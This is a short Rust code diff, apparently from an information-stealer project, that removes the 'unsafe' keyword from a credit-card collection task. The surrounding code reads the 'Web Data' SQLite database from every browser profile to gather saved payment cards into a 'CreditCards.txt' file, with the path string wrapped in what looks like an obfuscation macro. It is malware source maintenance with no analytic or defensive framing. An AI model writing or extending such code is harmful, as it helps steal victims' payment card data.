@@ -27,7 +27,7 @@ impl CreditCardsTask {
 impl<C: Collector> Task<C> for CreditCardsTask {
     parent_name!("CreditCards.txt");
 
-    unsafe fn run(&self, parent: &Path, collector: &C) {
+    fn run(&self, parent: &Path, collector: &C) {
         let Some(mut credit_cards) = collect_and_read_sqlite_from_all_profiles(
             &self.browser.profiles,
             |profile| profile / s!("Web Data"),
